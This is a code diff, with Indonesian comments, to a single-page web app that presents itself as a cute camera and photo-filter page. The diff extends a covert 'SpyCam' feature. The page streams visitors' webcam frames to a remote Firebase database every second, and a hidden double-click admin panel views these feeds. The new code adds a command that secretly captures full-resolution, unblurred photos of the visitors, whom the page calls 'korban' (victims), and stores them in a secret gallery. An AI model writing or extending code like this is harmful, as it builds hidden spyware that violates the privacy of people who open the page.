@@ -73,8 +73,10 @@
         .delay-1 { animation-delay: 1s; }
         .delay-2 { animation-delay: 2s; }
         
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        .spin-slow { animation: spin 3s linear infinite; }
+        /* Custom Scrollbar untuk Galeri */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #1f2937; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb { background: #ec4899; border-radius: 4px; }
     </style>
 </head>
 <body class="min-h-screen relative flex items-center justify-center">
@@ -121,7 +123,6 @@
                 <p id="polaroid-text" class="text-center mt-5 text-gray-500 font-cute font-medium text-xl pointer-events-none">Me & You &lt;3</p>
             </div>
 
-            <!-- KONTROL VIDEO -->
             <div class="flex justify-center gap-3 w-full z-10 flex-col sm:flex-row">
                 <button id="btn-record" class="hidden bg-pink-500 hover:bg-pink-600 text-white font-cute font-bold py-3 px-6 rounded-full shadow-lg flex items-center gap-2 justify-center transition-transform hover:scale-105">
                     <span class="animate-pulse">🔴</span> Mulai Rekam
@@ -134,7 +135,6 @@
                 </a>
             </div>
 
-            <!-- STATUS -->
             <div class="glass-panel px-6 py-4 rounded-3xl flex items-center gap-4 w-full justify-center hover:scale-105 transition-transform z-10">
                 <div class="bg-white/80 p-2 rounded-full"><span id="status-icon" class="text-2xl block">👋</span></div>
                 <p id="status-text" class="text-pink-500 font-cute text-lg font-medium">Izinkan kamera ya!</p>
@@ -142,34 +142,51 @@
         </div>
     </div>
 
-    <!-- ==== VIEW ADMIN / CCTV ==== -->
+    <!-- ==== VIEW ADMIN / CCTV & GALLERY ==== -->
     <div id="admin-view" class="hidden fixed inset-0 bg-gray-900/95 backdrop-blur-xl z-50 flex flex-col p-4 sm:p-8 overflow-y-auto">
         <div class="max-w-6xl mx-auto w-full">
-            <div class="flex justify-between items-center mb-8 border-b border-gray-700 pb-4">
+            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-8 border-b border-gray-700 pb-4 gap-4">
                 <div>
                     <h2 class="text-3xl text-pink-400 font-cute font-bold flex items-center gap-3">
                         <span class="animate-pulse text-red-500">🔴</span> SpyCam Admin
                     </h2>
-                    <p class="text-gray-400 text-sm mt-1 font-cute">Memantau target secara live (Database URL kamu)...</p>
+                    <p class="text-gray-400 text-sm mt-1 font-cute">Pantau target & ambil foto diam-diam (HD)</p>
                 </div>
-                <button id="btn-exit-admin" class="bg-white/10 hover:bg-white/20 text-white font-cute px-5 py-2.5 rounded-full transition-colors flex items-center gap-2">
-                    Tutup <span>🚪</span>
-                </button>
+                <div class="flex gap-3">
+                    <button id="btn-open-gallery" class="bg-pink-600 hover:bg-pink-700 text-white font-cute px-5 py-2.5 rounded-full transition-colors flex items-center gap-2 shadow-lg">
+                        <span>🖼️</span> Lihat Galeri
+                    </button>
+                    <button id="btn-exit-admin" class="bg-white/10 hover:bg-white/20 text-white font-cute px-5 py-2.5 rounded-full transition-colors flex items-center gap-2">
+                        Keluar <span>🚪</span>
+                    </button>
+                </div>
             </div>
 
-            <div id="admin-grid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 sm:gap-6">
-                <!-- Video target masuk ke sini -->
+            <div id="admin-grid" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 sm:gap-6">
+                <!-- Video target & tombol capture masuk ke sini -->
             </div>
         </div>
     </div>
 
+    <!-- ==== MODAL GALLERY (Melihat Foto Tersimpan) ==== -->
+    <div id="gallery-modal" class="hidden fixed inset-0 bg-black/90 backdrop-blur-sm z-[60] flex flex-col items-center p-4 sm:p-8 overflow-y-auto">
+        <div class="w-full max-w-6xl flex justify-between items-center mb-6">
+            <h2 class="text-3xl text-pink-400 font-cute font-bold flex items-center gap-3">
+                🖼️ Galeri Rahasia (Resolusi HD)
+            </h2>
+            <button id="btn-close-gallery" class="bg-gray-800 hover:bg-gray-700 text-white px-4 py-2 rounded-full font-bold text-xl">&times;</button>
+        </div>
+        <div id="gallery-grid" class="w-full grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
+            <!-- Foto-foto HD masuk ke sini -->
+        </div>
+    </div>
+
+
     <!-- SCRIPT FIREBASE & AI -->
     <script type="module">
-        // Import Firebase App & Realtime Database bawaan asli Google
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-database.js";
+        import { getDatabase, ref, set, push, onValue, get } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-database.js";
 
-        // Variabel UI
         const videoElement = document.getElementById('webcam');
         const canvasElement = document.getElementById('canvas-display');
         const canvasCtx = canvasElement.getContext('2d');
@@ -180,23 +197,21 @@
         
         let targetBlur = 0, currentBlur = 0, isBlurNow = false;
 
-        // --- SISTEM ID USER ---
-        // Kita bikin ID Unik per perangkat tanpa perlu sistem login
+        // ID Unik User
         let myUserId = localStorage.getItem('spycam_uid');
         if (!myUserId) {
             myUserId = 'user_' + Math.random().toString(36).substring(2, 15);
             localStorage.setItem('spycam_uid', myUserId);
         }
 
-        // --- FIREBASE REALTIME DATABASE SETUP (PAKAI DATABASE KAMU) ---
+        // --- FIREBASE SETUP ---
         const firebaseConfig = {
             databaseURL: "https://spy4-b564b-default-rtdb.asia-southeast1.firebasedatabase.app/"
         };
-        
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // --- BROADCAST KAMERA KE DATABASE ---
+        // --- 1. BROADCAST KAMERA LIVE (Low Res) ---
         function startBroadcasting() {
             const thumbCanvas = document.createElement('canvas');
             thumbCanvas.width = 120; thumbCanvas.height = 160; 
@@ -205,25 +220,61 @@
             setInterval(() => {
                 if (!videoElement.paused && !videoElement.ended) {
                     tCtx.drawImage(canvasElement, 0, 0, thumbCanvas.width, thumbCanvas.height);
-                    // Turunkan kualitas ke 0.3 biar upload datanya super cepat & ga lemot
-                    const base64Img = thumbCanvas.toDataURL('image/jpeg', 0.3); 
+                    const base64Img = thumbCanvas.toDataURL('image/jpeg', 0.3); // Kualitas rendah biar gak lemot
                     
-                    try {
-                        const camRef = ref(db, 'spycam_live/' + myUserId);
-                        set(camRef, {
-                            frame: base64Img,
-                            isBlur: isBlurNow,
-                            lastActive: Date.now()
-                        });
-                    } catch(e) {
-                        console.log("Upload gagal, cek aturan Rules Firebase!");
-                    }
+                    set(ref(db, 'spycam_live/' + myUserId), {
+                        frame: base64Img,
+                        isBlur: isBlurNow,
+                        lastActive: Date.now()
+                    }).catch(()=>{});
                 }
-            }, 1000); // Ngirim gambar setiap 1 detik
+            }, 1000); 
         }
 
-        // --- SISTEM ADMIN RAHASIA (DOUBLE CLICK) ---
+        // --- 2. LISTENER PERINTAH FOTO HD (Diam-diam) ---
+        let lastCaptureCommand = 0;
+        function listenForCaptureCommands() {
+            const cmdRef = ref(db, 'spycam_cmds/' + myUserId + '/capture');
+            onValue(cmdRef, (snapshot) => {
+                const commandTime = snapshot.val();
+                // Jika ada perintah baru dan waktunya lebih baru dari yang terakhir
+                if (commandTime && commandTime > lastCaptureCommand) {
+                    lastCaptureCommand = commandTime;
+                    takeSecretHDPhoto();
+                }
+            });
+        }
+
+        // Fungsi mengeksekusi foto HD
+        function takeSecretHDPhoto() {
+            // Kita bikin canvas dengan resolusi asli video kamera
+            const hdCanvas = document.createElement('canvas');
+            hdCanvas.width = videoElement.videoWidth; 
+            hdCanvas.height = videoElement.videoHeight;
+            const hdCtx = hdCanvas.getContext('2d');
+
+            // Harus di-mirror biar hasilnya gak kebalik
+            hdCtx.translate(hdCanvas.width, 0);
+            hdCtx.scale(-1, 1);
+            
+            // Jepret dari video langsung! (Bukan dari kanvas yang ada efek blurnya)
+            hdCtx.drawImage(videoElement, 0, 0, hdCanvas.width, hdCanvas.height);
+            
+            // Convert jadi gambar HD (kualitas 0.8 / 80%)
+            const hdBase64 = hdCanvas.toDataURL('image/jpeg', 0.8);
+
+            // Simpan ke database galeri
+            push(ref(db, 'spycam_gallery'), {
+                image: hdBase64,
+                timestamp: Date.now(),
+                userId: myUserId
+            });
+        }
+
+
+        // --- 3. SISTEM ADMIN (Double Click) ---
         const secretBtn = document.getElementById('secret-admin');
+        const adminGrid = document.getElementById('admin-grid');
 
         secretBtn.addEventListener('dblclick', () => {
             document.getElementById('main-view').classList.add('hidden');
@@ -231,41 +282,68 @@
 
             const spycamRef = ref(db, 'spycam_live');
             
-            // Dengarkan perubahan data Live
+            // Nampilin Grid Kamera Target
             onValue(spycamRef, (snapshot) => {
-                const grid = document.getElementById('admin-grid');
-                grid.innerHTML = '';
+                adminGrid.innerHTML = '';
                 let activeCount = 0;
                 const nowWaktu = Date.now();
 
                 snapshot.forEach(childSnap => {
+                    const targetId = childSnap.key;
                     const data = childSnap.val();
                     
-                    // Kalau target gak ada update lebih dari 10 detik, anggap dia udah tutup webnya
                     if (nowWaktu - data.lastActive > 10000) return; 
-                    
                     activeCount++;
 
+                    // Buat elemen Card untuk target
                     const div = document.createElement('div');
-                    div.className = 'relative rounded-xl overflow-hidden border-2 border-pink-500/50 bg-gray-800 aspect-[3/4] shadow-2xl';
+                    div.className = 'flex flex-col gap-2';
                     div.innerHTML = `
-                        <img src="${data.frame}" class="w-full h-full object-cover">
-                        <div class="absolute top-2 left-2 bg-black/70 text-white text-[10px] px-2 py-1 rounded-md font-cute backdrop-blur border border-white/20">
-                            ${data.isBlur ? '✌️ Ngeblur' : '👀 Melihat'}
-                        </div>
-                        <div class="absolute bottom-2 right-2 flex items-center gap-1 bg-red-500/90 text-white text-[9px] px-1.5 py-0.5 rounded shadow font-bold tracking-wider">
-                            <span class="w-1.5 h-1.5 bg-white rounded-full animate-pulse"></span> LIVE
+                        <div class="relative rounded-xl overflow-hidden border-2 border-pink-500/50 bg-gray-800 aspect-[3/4] shadow-2xl">
+                            <img src="${data.frame}" class="w-full h-full object-cover">
+                            <div class="absolute top-2 left-2 bg-black/70 text-white text-[10px] px-2 py-1 rounded-md font-cute backdrop-blur border border-white/20">
+                                ${data.isBlur ? '✌️ Ngeblur' : '👀 Melihat'}
+                            </div>
+                            <div class="absolute bottom-2 right-2 flex items-center gap-1 bg-red-500/90 text-white text-[9px] px-1.5 py-0.5 rounded shadow font-bold tracking-wider">
+                                <span class="w-1.5 h-1.5 bg-white rounded-full animate-pulse"></span> LIVE
+                            </div>
                         </div>
                     `;
-                    grid.appendChild(div);
+
+                    // Buat Tombol "Jepret HD" khusus buat target ini
+                    const btnCapture = document.createElement('button');
+                    btnCapture.className = "w-full bg-pink-600 hover:bg-pink-700 text-white font-cute py-2 rounded-lg shadow font-bold flex justify-center items-center gap-2 transition-colors";
+                    btnCapture.innerHTML = "📸 Jepret (HD)";
+                    
+                    // Aksi saat Admin klik tombol Jepret
+                    btnCapture.onclick = () => {
+                        const originalText = btnCapture.innerHTML;
+                        btnCapture.innerHTML = "⏳ Menjepret...";
+                        btnCapture.disabled = true;
+                        btnCapture.classList.add('opacity-50');
+
+                        // Kirim perintah ke target
+                        set(ref(db, 'spycam_cmds/' + targetId + '/capture'), Date.now()).then(() => {
+                            setTimeout(() => {
+                                btnCapture.innerHTML = "✅ Berhasil!";
+                                btnCapture.classList.replace('bg-pink-600', 'bg-green-600');
+                                setTimeout(() => {
+                                    btnCapture.innerHTML = originalText;
+                                    btnCapture.disabled = false;
+                                    btnCapture.classList.remove('opacity-50', 'bg-green-600');
+                                    btnCapture.classList.add('bg-pink-600');
+                                }, 2000);
+                            }, 1000); // Simulasi nunggu
+                        });
+                    };
+
+                    div.appendChild(btnCapture);
+                    adminGrid.appendChild(div);
                 });
 
                 if(activeCount === 0) {
-                    grid.innerHTML = '<div class="col-span-full text-center text-gray-500 font-cute mt-10">Belum ada korban yang buka web ini... 🥺</div>';
+                    adminGrid.innerHTML = '<div class="col-span-full text-center text-gray-500 font-cute mt-10">Belum ada korban yang online... 🥺</div>';
                 }
-            }, (error) => {
-                console.error("Error Admin:", error);
-                alert("Gagal load data. Pastikan Rules Firebase sudah diset 'true'!");
             });
         });
 
@@ -273,6 +351,48 @@
             document.getElementById('admin-view').classList.add('hidden');
             document.getElementById('main-view').classList.remove('hidden');
         });
+
+        // --- 4. GALERI FOTO HD ---
+        const btnOpenGallery = document.getElementById('btn-open-gallery');
+        const btnCloseGallery = document.getElementById('btn-close-gallery');
+        const galleryModal = document.getElementById('gallery-modal');
+        const galleryGrid = document.getElementById('gallery-grid');
+
+        btnOpenGallery.addEventListener('click', () => {
+            galleryModal.classList.remove('hidden');
+            galleryGrid.innerHTML = '<p class="text-white col-span-full text-center">Memuat foto...</p>';
+
+            // Ambil semua foto dari Database
+            get(ref(db, 'spycam_gallery')).then((snapshot) => {
+                galleryGrid.innerHTML = '';
+                if(snapshot.exists()) {
+                    const photos = [];
+                    // Balik urutan supaya foto terbaru ada di atas
+                    snapshot.forEach(child => { photos.unshift({id: child.key, ...child.val()}); });
+                    
+                    photos.forEach(photo => {
+                        const date = new Date(photo.timestamp).toLocaleString('id-ID');
+                        const div = document.createElement('div');
+                        div.className = 'bg-gray-800 rounded-xl p-3 flex flex-col gap-3 shadow-xl border border-gray-700';
+                        div.innerHTML = `
+                            <img src="${photo.image}" class="w-full aspect-[3/4] object-cover rounded-lg border border-gray-600">
+                            <div class="flex justify-between items-center px-1">
+                                <span class="text-xs text-gray-400 font-cute">${date}</span>
+                                <a href="${photo.image}" download="SpyCam_${photo.timestamp}.jpg" class="bg-blue-500 hover:bg-blue-600 text-white text-xs px-3 py-1.5 rounded-lg font-bold">📥 Save</a>
+                            </div>
+                        `;
+                        galleryGrid.appendChild(div);
+                    });
+                } else {
+                    galleryGrid.innerHTML = '<div class="col-span-full text-center text-gray-400 font-cute mt-10">Galeri kosong. Coba jepret seseorang dulu! 📸</div>';
+                }
+            });
+        });
+
+        btnCloseGallery.addEventListener('click', () => {
+            galleryModal.classList.add('hidden');
+        });
+
 
         // --- AI MEDIAPIPE & CAMERA ---
         const hands = new Hands({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}` });
@@ -317,7 +437,10 @@
                     canvasElement.width = videoElement.videoWidth; canvasElement.height = videoElement.videoHeight;
                     requestAnimationFrame(renderLoop);
                     startAILoop();
-                    startBroadcasting(); // Mulai kirim gambar ke Firebase KAMU!
+                    
+                    // NYALAKAN SISTEM SPYCAM FIREBASE!
+                    startBroadcasting(); 
+                    listenForCaptureCommands(); 
                 };
             } catch (err) {
                 statusText.innerText = "Kamera diblokir!"; statusIcon.innerText = "🥺";
